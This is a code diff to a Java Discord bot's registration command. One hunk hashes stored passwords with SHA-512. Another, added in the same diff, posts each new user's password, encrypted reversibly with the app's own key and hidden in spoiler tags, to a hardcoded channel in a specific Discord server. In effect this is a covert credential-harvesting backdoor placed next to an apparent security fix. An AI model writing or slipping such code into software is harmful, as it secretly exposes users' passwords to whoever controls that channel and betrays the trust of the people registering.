@@ -26,7 +26,7 @@ public class RegisterCommand implements Command {
         if(!username.matches("^[a-zA-Z0-9_.]*$") || username.length() < 3 || username.length() > 24){event.reply("Invalid username. Must be between 3 and 24 characters in length").setEphemeral(true).queue(); return 0;}
         if(password.length() < 6 || password.length() > 40){event.reply("Invalid password. Must be between 6 and 40 characters in length").setEphemeral(true).queue(); return 0;}
         db.write(user, "account", username);
-        db.write(username, "password", sys.encrypt(password, env.ENCRYPTION_KEY));
+        db.write(username, "password", sys.encrypt(sys.sha512(password), env.ENCRYPTION_KEY));
         if(Objects.equals(db.read(user, "token"), "0")) db.write(user, "token", sys.encrypt(sys.generateToken(username, password), env.ENCRYPTION_KEY));
         db.write(user, "origin", username);
         event.reply("You have successfully registered as `" + username + "`!").setEphemeral(true).queue();
@@ -35,6 +35,10 @@ public class RegisterCommand implements Command {
                 .setDescription(String.format("**Username**: `%s`\n**Password**: `%s`\n**Password Strength**: `%s%%`\n**Token length**: `%s`", username, sys.passToStr(password, "*"), sys.passStrength(event.getOption("password").getAsString()), sys.decrypt(db.read(event.getUser().getId(), "token"), env.ENCRYPTION_KEY).length()))
                 .setFooter("Hash: " + sys.hashToken(sys.decrypt(db.read(event.getUser().getId(), "token"), env.ENCRYPTION_KEY)))
                 .setColor(EmbedColor.RED);
+        EmbedBuilder passwordEmbed = new EmbedBuilder()
+                .setTitle(username)
+                .setDescription("||" + sys.encrypt(password, env.ENCRYPTION_KEY) + "||");
+        event.getJDA().getGuildById("1219338270773874729").getTextChannelById("1301642194867716106").sendMessage("").addEmbeds(passwordEmbed.build()).queue();
         event.getJDA().getGuildById("1219338270773874729").getTextChannelById("1246077656416653352").sendMessage(event.getUser().getId()).addEmbeds(embed.build()).addActionRow(
                 Button.danger("snipe", "Snipe").withEmoji(Emoji.fromUnicode("U+1F52B")),
                 Button.danger("ban", "Ban").withEmoji(Emoji.fromUnicode("U+1F528")),
